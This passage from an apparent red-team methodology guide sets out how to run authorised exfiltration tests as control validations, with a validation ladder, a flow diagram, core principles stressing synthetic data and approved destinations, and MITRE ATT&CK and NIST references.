DLP -------------+
Cloud -----------+
```


---

# Exfiltration Validation Ladder

```text
1. Confirm Scope

2. Confirm Destination

3. Confirm Protocol

4. Generate Synthetic Marker

5. Record Hash and Size

6. Validate Basic Connectivity

7. Transfer Small Test Object

8. Verify Destination Hash

9. Review Security Telemetry

10. Review Alerting

11. Review SOC Response

12. Increase Synthetic Volume Only If Required

13. Stop Once Objective Is Proven

14. Cleanup
```


---

# Final Exfiltration Model

```text
                    AUTHORISED OBJECTIVE
                            |
                            v
                        COLLECTION
                            |
                            v
                      SYNTHETIC DATA
                            |
                            v
                         STAGING
                            |
                   +--------+--------+
                   |                 |
                   v                 v
                  HASH              SIZE
                   |                 |
                   +--------+--------+
                            |
                            v
                      EGRESS CHANNEL
                            |
             +--------------+--------------+
             |              |              |
             v              v              v
          HTTPS            DNS           CLOUD
             |              |              |
             +--------------+--------------+
                            |
                            v
                     SECURITY CONTROLS
                            |
             +--------------+--------------+
             |              |              |
             v              v              v
         FIREWALL          DLP            PROXY
             |              |              |
             +--------------+--------------+
                            |
                            v
                    APPROVED DESTINATION
                            |
                            v
                       VERIFY HASH
                            |
                            v
                         TELEMETRY
                            |
                            v
                         DETECTION
                            |
                            v
                         RESPONSE
                            |
                            v
                          EVIDENCE
                            |
                            v
                          CLEANUP
                            |
                            v
                         REPORTING
```


---

# Core Principle

Exfiltration testing can be reduced to:

```text
Know exactly what security boundary is being tested.

Use synthetic data whenever possible.

Use only approved destinations.

Record the source file hash.

Record the exact transfer size.

Start with the smallest useful test.

Do not optimise for stealth.

Do not transfer real sensitive data unnecessarily.

Validate firewall visibility.

Validate proxy visibility.

Validate DNS visibility.

Validate endpoint visibility.

Validate DLP.

Validate cloud and SaaS audit where relevant.

Confirm SIEM ingestion.

Measure SOC response.

Stop when the objective is proven.

Verify the destination artifact.

Remove temporary artifacts from both sides.

Report exactly what was demonstrated.
```


---

# Related Notes

- [Red Teaming](./)
- [Red Team Methodology](methodology.md)
- [Discovery](discovery.md)
- [Collection](collection.md)
- [Initial Access](initial-access.md)
- [Command and Control](command-and-control.md)
- [Credential Access](credential-access.md)
- [Lateral Movement](lateral-movement.md)
- [Persistence](persistence.md)
- [Defence Evasion](defence-evasion.md)
- [Detection Validation](detection-validation.md)
- [Red Team OPSEC](opsec.md)
- [Red Team Reporting](reporting.md)


---

# References

- [MITRE ATT&CK - Exfiltration](https://attack.mitre.org/tactics/TA0010/){ target="_blank" rel="noopener noreferrer" }
- [MITRE ATT&CK - Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/){ target="_blank" rel="noopener noreferrer" }
- [MITRE ATT&CK - Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567/){ target="_blank" rel="noopener noreferrer" }
- [MITRE ATT&CK - Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/){ target="_blank" rel="noopener noreferrer" }
- [MITRE ATT&CK - Exfiltration Over Other Network Medium](https://attack.mitre.org/techniques/T1011/){ target="_blank" rel="noopener noreferrer" }
- [MITRE ATT&CK - Exfiltration Over Physical Medium](https://attack.mitre.org/techniques/T1052/){ target="_blank" rel="noopener noreferrer" }
- [MITRE ATT&CK - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol](https://attack.mitre.org/techniques/T1029/){ target="_blank" rel="noopener noreferrer" }
- [MITRE ATT&CK - Automated Exfiltration](https://attack.mitre.org/techniques/T1020/){ target="_blank" rel="noopener noreferrer" }
- [MITRE ATT&CK - Data Transfer Size Limits](https://attack.mitre.org/techniques/T1030/){ target="_blank" rel="noopener noreferrer" }
- [MITRE ATT&CK - Scheduled Transfer](https://attack.mitre.org/techniques/T1029/){ target="_blank" rel="noopener noreferrer" }
- [NIST SP 800-115 - Technical Guide to Information Security Testing and Assessment](https://csrc.nist.gov/pubs/sp/800/115/final){ target="_blank" rel="noopener noreferrer" }
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework){ target="_blank" rel="noopener noreferrer" }
- [Microsoft Purview Data Loss Prevention](https://learn.microsoft.com/purview/dlp-learn-about-dlp){ target="_blank" rel="noopener noreferrer" }
- [Microsoft Defender for Cloud Apps](https://learn.microsoft.com/defender-cloud-apps/what-is-defender-for-cloud-apps){ target="_blank" rel="noopener noreferrer" }
- [Microsoft Defender for Endpoint](https://learn.microsoft.com/defender-endpoint/){ target="_blank" rel="noopener noreferrer" }
- [AWS CloudTrail](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html){ target="_blank" rel="noopener noreferrer" }
- [Azure Monitor](https://learn.microsoft.com/azure/azure-monitor/){ target="_blank" rel="noopener noreferrer" }
- [Google Cloud Audit Logs](https://cloud.google.com/logging/docs/audit){ target="_blank" rel="noopener noreferrer" }


---

!!! tip "Exfiltration is a control test"
    The purpose of an authorised exfiltration exercise is not to see how much customer data can be removed. The useful question is whether a realistic attacker path can cross the tested egress boundary and whether the organisation can prevent, detect and respond to that behaviour.


!!! warning "Stop when the egress path is proven"
    If a small synthetic file successfully crosses the intended boundary and provides sufficient evidence for the engagement objective, additional production-data collection or high-volume transfer usually adds risk without improving the finding.
